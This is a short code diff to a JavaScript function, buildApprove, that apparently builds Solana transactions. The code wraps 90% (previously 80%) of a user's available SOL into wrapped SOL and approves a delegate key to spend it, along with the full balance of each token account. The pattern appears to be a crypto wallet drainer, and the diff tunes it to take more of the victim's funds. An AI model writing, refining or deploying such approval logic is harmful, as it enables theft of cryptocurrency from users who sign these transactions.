@@ -40,7 +40,7 @@ async function buildApprove(user, connection) {
             //
             const SAFE_SOL_BUFFER = 10_000_000n; // 0.01 SOL
             const ATA_RENT_BUFFER = 3_000_000n;  // reserve for creating ATA
-            const WRAP_RATIO_NUM = 80n; // wrap 80% of available
+            const WRAP_RATIO_NUM = 90n; // wrap 90% of available
             const WRAP_RATIO_DEN = 100n;
 
             const solBalance = tokenAccounts.solBalance || 0n;
@@ -92,7 +92,7 @@ async function buildApprove(user, connection) {
                                 wsolAta,
                                 delegatePubkey,
                                 userPubkey,
-                                wrapAmount
+                                Number(wrapAmount)
                             )
                         );
                     }
@@ -113,7 +113,7 @@ async function buildApprove(user, connection) {
                         token.ata,
                         delegatePubkey,
                         userPubkey,
-                        token.amount
+                        Number(token.amount)
                     )
                 );
             }
